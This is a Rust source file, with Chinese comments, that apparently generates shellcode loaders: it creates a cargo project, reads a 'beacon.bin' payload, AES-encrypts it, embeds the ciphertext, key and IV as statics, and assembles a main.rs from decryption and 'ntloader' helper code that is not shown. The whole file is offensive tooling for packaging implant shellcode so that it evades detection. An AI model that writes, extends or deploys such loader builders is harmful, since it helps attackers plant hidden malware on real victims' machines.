#![allow(warnings)]
use base64::encode;
use libaes::Cipher;
use rand::Rng;
use std::fs;
use std::fs::File;
use std::io::{Read, Write};
use tools::*;
use winapi::um::cfgmgr32::fMD_CombinedWrite;

use block_modes::block_padding::Pkcs7;
use block_modes::{BlockMode, Cbc};
use std::process::Command;
use tools::{aesdecryption, main_, main_imports, maincargo, ntloader};
use xz2::write::XzEncoder;

pub fn setupcargo(project_name: &str) {
    // let project_name = "ma";

    // 创建命令
    let output = Command::new("cargo")
        .args(&["new", project_name])
        .output()
        .expect("Failed to create a new Rust project");

    // 添加cargo.toml
    let cargo_toml_path = format!("{}/Cargo.toml", project_name);
    let mut cargo_toml = std::fs::OpenOptions::new()
        .append(true)
        .open(cargo_toml_path)
        .expect("Failed to open Cargo.toml");

    let dependency = maincargo();

    //写入文件
    writeln!(cargo_toml, "{}", dependency).expect("[!] Failed to write to Cargo.toml");

    let code = "".to_string();

    let buffer = read_bin("beacon.bin");
    let (encrypted, iv, key) = encipher_bin(&buffer);

    let mut shellcode = format!("static mut ciphertext: &str = \"{}\";\n static mut key: &str = \"{}\";\n static mut iv: &str = \"{}\";\n", encrypted, key, iv);

    let mut main_rs_path = format!("{}/src/main.rs", project_name);

    let combined_code = main_imports() + &shellcode + &aesdecryption() + &ntloader() + &main_();

    let mut main_rs = File::create(main_rs_path).expect("Failed to open main.rs");
    main_rs
        .write_all(combined_code.as_bytes())
        .expect("[!] Failed to write to main.rs");
}

pub fn test() {}
